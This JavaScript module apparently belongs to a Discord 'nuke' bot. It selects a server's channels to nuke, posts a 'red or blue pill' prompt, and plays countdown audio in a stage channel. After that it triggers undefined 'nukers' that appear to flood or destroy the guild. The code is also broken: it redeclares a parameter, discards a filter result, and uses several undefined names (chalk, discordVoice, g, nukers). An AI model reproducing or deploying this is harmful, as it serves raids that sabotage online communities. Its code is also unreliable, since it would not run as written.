const config = require("./config");
const discord = require("discord.js");
const path = require("path");
const fs = require("fs");

/**
 * Filters a collection of channels to nuke
 *
 * @param {discord.Collection} channels
 */
exports.filterChannels = async (channels, msg) => {
	let channels = channels.cache.filter(
		(c) =>
			c?.id !== config.get("nukeDumpChannel") && !config.get("nukeExcludeChannels").includes(c?.id)
	);
	if (msg) channels.filter((c) => c?.id !== msg?.channel?.id);
	return channels;
};

/**
 * Sends the starter message that asks if the user would like the red or blue pill.
 *
 * @param {discord.Channel} channel
 * @returns
 */
exports.sendStarterMessage = async (channel) => {
	if (config.get("emojis:redpill") == null || config.get("emojis:bluepill") == null)
		return console.log(chalk.redBright(`Emojis in config.json are blank!`));
	pillmsg = await channel.send("Pick the red or blue pill...");
	pillmsg.react(config.get("emojis:redpill"));
	pillmsg.react(config.get("emojis:bluepill"));
	validPills.push(pillmsg);
};

/**
 * The bot will look for a stage channel to start a stage instance in.
 * If it can't find one, it will create a new one.
 *
 * @param {discord.Guild} guild
 * @returns
 */
exports.startVoiceConnection = async (guild) => {
	console.log(`Creating stage channel in ${guild.name}`);
	const stage =
		guild.channels.cache.find((c) => c.type === "GUILD_STAGE_VOICE") ||
		(await guild.channels.create("Stage", { type: "GUILD_STAGE_VOICE" }));
	await stage.createStageInstance({ topic: config.get("stageName") }).catch(() => {});

	const connection = discordVoice.joinVoiceChannel({
		channelId: stage.id,
		guildId: stage.guild.id,
		adapterCreator: guild.voiceAdapterCreator,
	});
	const player = discordVoice.createAudioPlayer({
		behaviors: {
			noSubscriber: discordVoice.NoSubscriberBehavior.Play,
		},
	});
	connection.subscribe(player);

	player.play(
		discordVoice.createAudioResource(path.join(__dirname, "audio", "tminus.mp3"), {
			metadata: "tminus",
		}),
		stage.id,
		guild.id
	);

	player.on("stateChange", (oldState, newState) => {
		if (
			newState.status === discordVoice.AudioPlayerStatus.Idle &&
			oldState.status !== discordVoice.AudioPlayerStatus.Idle
		) {
			if (oldState.resource.metadata == "tminus") {
				const resource = discordVoice.createAudioResource(
					path.join(__dirname, "audio", "bangarang.mp3"),
					{
						metadata: "bangarang",
					}
				);
				player.play(resource, stage.id, g.id);

				setTimeout(() => {
					console.log(`Nuking ${g.name} with ${messagesInEachChannel} messages`);
					nukers.forEach((nuker) => {
						nuker.run({ guild: g }, channels);
					});
				}, 27.5 * 1000);
			}
		}
	});

	return player;
};
